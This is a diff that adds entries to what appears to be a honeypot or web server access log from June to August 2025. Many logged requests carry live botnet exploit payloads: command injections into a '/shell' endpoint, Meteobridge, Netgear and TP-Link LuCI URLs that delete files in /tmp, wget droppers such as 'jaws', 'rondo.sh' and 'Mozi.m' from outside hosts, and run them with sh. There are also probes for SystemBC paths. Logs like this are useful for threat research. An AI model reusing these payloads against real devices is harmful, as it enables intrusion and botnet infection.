@@ -15,6 +15,10 @@
 162.243.123.35 - - [06/Jul/2025 14:55:46] "GET /systembc/password.php HTTP/1.1" 200 -
 188.166.246.171 - - [06/Jul/2025 16:06:36] "GET /systembc/password.php HTTP/1.1" 200 -
 146.190.124.10 - - [07/Jul/2025 01:17:21] "GET /systembc/password.php HTTP/1.1" 200 -
+137.184.3.83 - - [04/Aug/2025 10:08:12] "GET /systembc/password.php HTTP/1.1" 200 -
+164.92.248.97 - - [05/Aug/2025 14:26:26] "GET /systembc/password.php HTTP/1.1" 200 -
+167.71.181.220 - - [06/Aug/2025 18:11:47] "GET /systembc/password.php HTTP/1.1" 200 -
+143.198.150.108 - - [06/Aug/2025 19:03:00] "GET /systembc/password.php HTTP/1.1" 200 -
 206.189.11.171 - - [03/Jun/2025 23:57:59] "GET /systembc/password.php HTTP/1.1" 200 -
 209.38.90.32 - - [04/Jun/2025 13:07:31] "GET /systembc/password.php HTTP/1.1" 200 -
 209.38.99.66 - - [05/Jun/2025 02:08:59] "GET /systembc/password.php HTTP/1.1" 200 -
@@ -68,6 +72,22 @@
 47.237.104.170 - - [07/Jul/2025 07:21:44] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
 8.222.163.222 - - [07/Jul/2025 08:43:30] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
 8.222.163.222 - - [07/Jul/2025 08:43:30] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+118.194.249.90 - - [05/Aug/2025 05:56:43] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+118.194.249.90 - - [05/Aug/2025 05:56:43] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+8.219.81.129 - - [05/Aug/2025 15:56:48] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+8.219.81.129 - - [05/Aug/2025 15:56:48] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+8.219.136.190 - - [06/Aug/2025 03:26:11] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+8.219.136.190 - - [06/Aug/2025 03:26:11] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+8.222.173.105 - - [06/Aug/2025 05:14:03] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+8.222.173.105 - - [06/Aug/2025 05:14:03] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+170.253.56.193 - - [06/Aug/2025 07:35:50] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+170.253.56.193 - - [06/Aug/2025 07:35:50] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+8.210.161.193 - - [06/Aug/2025 07:47:23] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+8.210.161.193 - - [06/Aug/2025 07:47:23] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+41.47.175.220 - - [06/Aug/2025 12:56:04] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+41.47.175.220 - - [06/Aug/2025 12:56:04] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+41.40.47.24 - - [07/Aug/2025 10:00:35] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+41.40.47.24 - - [07/Aug/2025 10:00:35] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
 45.135.194.34 - - [03/Jun/2025 23:32:48] "GET /public/template.cgi?templatefile=$(cd%20%2Ftmp%3Brm%20-rf%20rondo.sh%3Bwget%20http%3A%2F%2F78.153.149.90%2Frondo.sh%3Bsudo%20sh%20rondo.sh%20meteobridge%7C%7Csh%20rondo.sh%20meteobridge%3Becho%20) HTTP/1.1" 200 -
 120.28.168.233 - - [05/Jun/2025 11:43:34] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.28.168.233:55841/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 200 -
 87.121.84.34 - - [08/Jun/2025 16:25:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
@@ -182,6 +202,7 @@
 87.121.84.34 - - [07/Jul/2025 01:01:27] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.234.135/x/tplink+-O-|sh) HTTP/1.1" 200 -
 45.194.66.8 - - [07/Jul/2025 03:50:05] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 45.194.66.8 - - [07/Jul/2025 04:37:45] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+149.50.96.5 - - [06/Aug/2025 01:16:12] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 89.42.231.140 - - [03/Jun/2025 12:04:40] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 89.42.231.140 - - [03/Jun/2025 13:46:58] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 89.42.231.140 - - [03/Jun/2025 16:48:34] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
